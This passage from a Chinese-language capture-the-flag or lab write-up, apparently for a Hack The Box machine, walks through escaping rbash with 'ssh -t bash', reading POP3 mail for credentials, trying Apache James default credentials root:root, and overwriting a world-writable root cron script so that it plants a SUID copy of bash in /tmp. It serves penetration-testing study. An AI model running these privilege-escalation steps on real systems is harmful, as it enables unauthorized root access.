绕过 rbash 受限 Shell

登录后发现 mindy 的 shell 是 /bin/rbash（受限 bash），很多命令无法执行。绕过方法：

ssh mindy@10.129.55.82 -t bash

-t bash 参数让 SSH 在建立连接后直接启动 /bin/bash，绕过 .bashrc 中配置的 rbash 限制。

⚠️ 踩坑提醒

POP3 协议命令是 USER/PASS/LIST/RETR，不是 Linux 命令

RETR 1 读第一封邮件，RETR 2 读第二封——要逐封检查，SSH 凭据在第二封

rbash 会限制 cd、路径中的 /、环境变量修改等，用 ssh -t bash 是最简单的绕过方式

权限提升 World-Writable Cron 脚本

发现可写的 root 脚本

ls -la /opt/
-rwxrwxrwx 1 root root 105 Aug 22 2017 tmp.py

/opt/tmp.py 由 root 拥有，但权限是 777（所有人可读写执行）。这个脚本被 root 的 cron 定时任务定期执行（用于清理 /tmp 目录）。

🧒 儿童版：root 用户有一个自动脚本，每隔几分钟运行一次来清理临时文件。但这个脚本的权限设置有 bug——任何人都能修改它的内容。我们把"清理临时文件"改成"复制一个 root 权限的 bash 给我"，然后坐等 root 帮我们执行。

修改脚本内容

cat > /opt/tmp.py << 'EOF'
#!/usr/bin/env python
import os
import sys
try:
     os.system('/bin/cp /bin/bash /tmp/rootbash;/bin/chmod 4777 /tmp/rootbash; ')
except:
     sys.exit()
EOF

等待 Cron 执行

等待几分钟后：

ls -la /tmp/rootbash
-rwsrwxrwx 1 root root 1265272 Sep  7 15:57 rootbash

SUID bash 已生成。

额外知识

Apache James 2.x 管理端口

Apache James 是 Java 编写的开源邮件服务器。2.x 版本通过 4555 端口提供纯文本管理界面，默认凭据 root:root。常用命令：

命令功能
listusers列出所有邮箱用户
adduser <user> <pass>添加用户
setpassword <user> <pass>重置用户密码
verify <user>验证用户是否存在
deluser <user>删除用户

James 3.x 已移除 4555 端口的 Telnet 管理方式，改用 JMX（端口 9999）和 james-cli 工具。渗透测试中遇到 4555 端口时，第一反应应该是尝试 root:root。

POP3 协议基础

POP3（Post Office Protocol v3）是最基本的邮件接收协议，基于纯文本：

命令功能
USER <name>指定用户名
PASS <password>输入密码
LIST列出邮件编号和大小
RETR <n>读取第 n 封邮件全文
DELE <n>标记删除第 n 封
STAT查看邮件数量和总大小
QUIT退出并执行删除

由于是纯文本协议，用 telnet 或 nc 即可直接交互，不需要邮件客户端。

World-Writable 文件安全隐患

Linux 文件权限为 777（rwxrwxrwx）意味着任何用户都可以读、写、执行该文件。如果这个文件还被 root 的 cron 任务执行，就形成了提权路径。查找这类文件的命令：

# 查找所有人可写的文件（排除 /proc /sys /dev）
find / -writable -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -type f 2>/dev/null

# 查找 777 权限的文件
find / -perm -0777 -type f 2>/dev/null
